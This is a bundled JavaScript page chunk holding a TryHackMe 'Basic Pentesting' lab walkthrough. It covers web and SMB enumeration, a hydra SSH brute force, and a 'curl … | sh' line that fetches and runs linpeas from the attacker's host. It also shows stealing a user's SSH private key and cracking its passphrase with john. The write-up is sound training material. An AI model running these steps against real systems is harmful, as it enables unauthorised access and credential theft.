"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[668],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>h});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),u=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},p=function(e){var n=u(e.components);return r.createElement(l.Provider,{value:n},e.children)},c="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),c=u(t),d=a,h=c["".concat(l,".").concat(d)]||c[d]||m[d]||o;return t?r.createElement(h,i(i({ref:n},p),{},{components:t})):r.createElement(h,i({ref:n},p))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,i=new Array(o);i[0]=d;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[c]="string"==typeof e?e:a,i[1]=s;for(var u=2;u<o;u++)i[u]=t[u];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},30938:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>m,frontMatter:()=>o,metadata:()=>s,toc:()=>u});var r=t(87462),a=(t(67294),t(3905));const o={},i="Basic Pentesting",s={unversionedId:"Tryhackme/BasicPentesting/Basic Pentesting",id:"Tryhackme/BasicPentesting/Basic Pentesting",title:"Basic Pentesting",description:"This is a machine that allows you to practise web app hacking and privilege escalation",source:"@site/writeups/Tryhackme/BasicPentesting/Basic Pentesting.md",sourceDirName:"Tryhackme/BasicPentesting",slug:"/Tryhackme/BasicPentesting/Basic Pentesting",permalink:"/writeups/Tryhackme/BasicPentesting/Basic Pentesting",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Basic Malware RE",permalink:"/writeups/Tryhackme/Basic Malware RE/"},next:{title:"Binex",permalink:"/writeups/Tryhackme/Binex/"}},l={},u=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Web App Testing and Privilege Escalation",id:"web-app-testing-and-privilege-escalation",level:2}],p={toc:u},c="wrapper";function m(e){let{components:n,...t}=e;return(0,a.kt)(c,(0,r.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"basic-pentesting"},"Basic Pentesting"),(0,a.kt)("p",null,"This is a machine that allows you to practise web app hacking and privilege escalation"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/basicpentestingjt"},"Basic Pentesting")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Linux Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing Hash"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing SSH Key")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"web-app-testing-and-privilege-escalation"},"Web App Testing and Privilege Escalation"),(0,a.kt)("p",null,"In these set of tasks you'll learn the following:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"brute forcing"),(0,a.kt)("li",{parentName:"ul"},"hash cracking"),(0,a.kt)("li",{parentName:"ul"},"service enumeration"),(0,a.kt)("li",{parentName:"ul"},"Linux Enumeration")),(0,a.kt)("p",null,"The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file."),(0,a.kt)("p",null,"Credits to ",(0,a.kt)("a",{parentName:"p",href:"https://www.vulnhub.com/author/josiah-pierce,569/"},"Josiah Pierce")," from Vulnhub."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Deploy the machine and connect to our network")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Find the services exposed by the machine")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"What is the name of the hidden directory on the web server(enter name without /)?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"gobuster dir -u http://10.10.103.107/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.103.107/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/09/15 08:34:37 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/development (Status: 301)\n/index.html (Status: 200)\n/server-status (Status: 403)\n===============================================================\n2020/09/15 08:34:54 Finished\n===============================================================\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"development")),(0,a.kt)("ol",{start:4},(0,a.kt)("li",{parentName:"ol"},"User brute-forcing to find the username & password")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"/usr/share/enum4linux/enum4linux.pl -a $ip | tee enum4linux.log\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 15 08:36:39 2020\n\n ==========================\n|    Target Information    |\n ==========================\nTarget ........... 10.10.103.107\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n\n =====================================================\n|    Enumerating Workgroup/Domain on 10.10.103.107    |\n =====================================================\n[+] Got domain/workgroup name: WORKGROUP\n\n =============================================\n|    Nbtstat Information for 10.10.103.107    |\n =============================================\nLooking up status of 10.10.103.107\n        BASIC2          <00> -         B <ACTIVE>  Workstation Service\n        BASIC2          <03> -         B <ACTIVE>  Messenger Service\n        BASIC2          <20> -         B <ACTIVE>  File Server Service\n        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser\n        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name\n        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser\n        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections\n\n        MAC Address = 00-00-00-00-00-00\n\n ======================================\n|    Session Check on 10.10.103.107    |\n ======================================\n[+] Server 10.10.103.107 allows sessions using username '', password ''\n\n ============================================\n|    Getting domain SID for 10.10.103.107    |\n ============================================\nDomain Name: WORKGROUP\nDomain Sid: (NULL SID)\n[+] Can't determine if host is part of domain or part of a workgroup\n\n =======================================\n|    OS information on 10.10.103.107    |\n =======================================\nUse of uninitialized value $os_info in concatenation (.) or string at /usr/share/enum4linux/enum4linux.pl line 464.\n[+] Got OS info for 10.10.103.107 from smbclient:\n[+] Got OS info for 10.10.103.107 from srvinfo:\n        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu\n        platform_id     :       500\n        os version      :       6.1\n        server type     :       0x809a03\n\n ==============================\n|    Users on 10.10.103.107    |\n ==============================\nUse of uninitialized value $users in print at /usr/share/enum4linux/enum4linux.pl line 874.\nUse of uninitialized value $users in pattern match (m//) at /usr/share/enum4linux/enum4linux.pl line 877.\n\nUse of uninitialized value $users in print at /usr/share/enum4linux/enum4linux.pl line 888.\nUse of uninitialized value $users in pattern match (m//) at /usr/share/enum4linux/enum4linux.pl line 890.\n\n ==========================================\n|    Share Enumeration on 10.10.103.107    |\n ==========================================\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        Anonymous       Disk\n        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)\nSMB1 disabled -- no workgroup available\n\n[+] Attempting to map shares on 10.10.103.107\n//10.10.103.107/Anonymous       Mapping: OK, Listing: OK\n//10.10.103.107/IPC$    [E] Can't understand response:\nNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*\n\n =====================================================\n|    Password Policy Information for 10.10.103.107    |\n =====================================================\n[E] Unexpected error from polenum:\n\n\n[+] Attaching to 10.10.103.107 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n        [!] Protocol failed: Missing required parameter 'digestmod'.\n\n[+] Trying protocol 445/SMB...\n\n        [!] Protocol failed: Missing required parameter 'digestmod'.\n\n\n[+] Retieved partial password policy with rpcclient:\n\nPassword Complexity: Disabled\nMinimum Password Length: 5\n\n\n ===============================\n|    Groups on 10.10.103.107    |\n ===============================\n\n[+] Getting builtin groups:\n\n[+] Getting builtin group memberships:\n\n[+] Getting local groups:\n\n[+] Getting local group memberships:\n\n[+] Getting domain groups:\n\n[+] Getting domain group memberships:\n\n ========================================================================\n|    Users on 10.10.103.107 via RID cycling (RIDS: 500-550,1000-1050)    |\n ========================================================================\n[I] Found new SID: S-1-22-1\n[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869\n[I] Found new SID: S-1-5-32\n[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''\nS-1-5-21-2853212168-2008227510-3551253869-500 *unknown*\\*unknown* (8)\nS-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\\nobody (Local User)\n[...]\nS-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\\None (Domain Group)\n[...]\n[+] Enumerating users using SID S-1-5-32 and logon username '', password ''\n[...]\nS-1-5-32-544 BUILTIN\\Administrators (Local Group)\nS-1-5-32-545 BUILTIN\\Users (Local Group)\nS-1-5-32-546 BUILTIN\\Guests (Local Group)\nS-1-5-32-547 BUILTIN\\Power Users (Local Group)\nS-1-5-32-548 BUILTIN\\Account Operators (Local Group)\nS-1-5-32-549 BUILTIN\\Server Operators (Local Group)\nS-1-5-32-550 BUILTIN\\Print Operators (Local Group)\n[...]\n[+] Enumerating users using SID S-1-22-1 and logon username '', password ''\nS-1-22-1-1000 Unix User\\kay (Local User)\nS-1-22-1-1001 Unix User\\jan (Local User)\n\n ==============================================\n|    Getting printer info for 10.10.103.107    |\n ==============================================\nNo printers returned.\n\n\nenum4linux complete on Tue Sep 15 08:40:44 2020\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.103.107 ssh\n")),(0,a.kt)("ol",{start:5},(0,a.kt)("li",{parentName:"ol"},"What is the username?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"jan")),(0,a.kt)("ol",{start:6},(0,a.kt)("li",{parentName:"ol"},"What is the password?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.103.107 ssh\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-15 08:39:20\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://10.10.103.107:22/\n[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344223 to do in 1343:06h, 16 active\n[STATUS] 124.00 tries/min, 372 tries in 00:03h, 14344029 to do in 1927:58h, 16 active\n[22][ssh] host: 10.10.103.107   login: jan   password: armando\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 2 final worker threads did not complete until end.\n[ERROR] 2 targets did not resolve or could not be connected\n[ERROR] 0 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-15 08:46:06\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"armando")),(0,a.kt)("ol",{start:7},(0,a.kt)("li",{parentName:"ol"},"What service do you use to access the server(answer in abbreviation in all caps)?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"ssh")),(0,a.kt)("ol",{start:8},(0,a.kt)("li",{parentName:"ol"},"Enumerate the machine to find any vectors for privilege escalation")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Hacker: ",(0,a.kt)("inlineCode",{parentName:"li"},"sudo python3 -m http.server 80")),(0,a.kt)("li",{parentName:"ul"},"Target: ",(0,a.kt)("inlineCode",{parentName:"li"},"curl http://10.8.106.222/linpeas.sh | sh"))),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"[+] Files inside others home (limit 20)\n/home/kay/.profile\n/home/kay/.viminfo\n/home/kay/.bashrc\n/home/kay/.bash_history\n/home/kay/.lesshst\n/home/kay/.ssh/authorized_keys\n/home/kay/.ssh/id_rsa\n/home/kay/.ssh/id_rsa.pub\n/home/kay/.bash_logout\n/home/kay/.sudo_as_admin_successful\n/home/kay/pass.bak\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Copy/Paste ",(0,a.kt)("inlineCode",{parentName:"li"},"/home/kay/id_rsa")," to Hacker")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"no answer needed")),(0,a.kt)("ol",{start:9},(0,a.kt)("li",{parentName:"ol"},"What is the name of the other user you found(all lower case)?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"kay")),(0,a.kt)("ol",{start:10},(0,a.kt)("li",{parentName:"ol"},"If you have found another user, what can you do with this information?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("ol",{start:11},(0,a.kt)("li",{parentName:"ol"},"What is the final password you obtain?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/usr/share/john/ssh2john.py kay_id_rsa > kay_id_rsa.jtr")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"john --w=/usr/share/wordlists/rockyou.txt kay_id_rsa.jtr")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Using default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\nbeeswax          (kay_id_rsa)\n1g 0:00:00:12 DONE (2020-09-15 09:05) 0.08143g/s 1167Kp/s 1167Kc/s 1167KC/sa6_123..*7\xa1Vamos!\nSession completed\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"ssh -i kay_id_rsa kay@10.10.103.107")," Passphrase: ",(0,a.kt)("inlineCode",{parentName:"p"},"beeswax")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kay@basic2:~$ cat pass.bak\nheresareallystrongpasswordthatfollowsthepasswordpolicy$$\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"heresareallystrongpasswordthatfollowsthepasswordpolicy$$")))}m.isMDXComponent=!0}}]);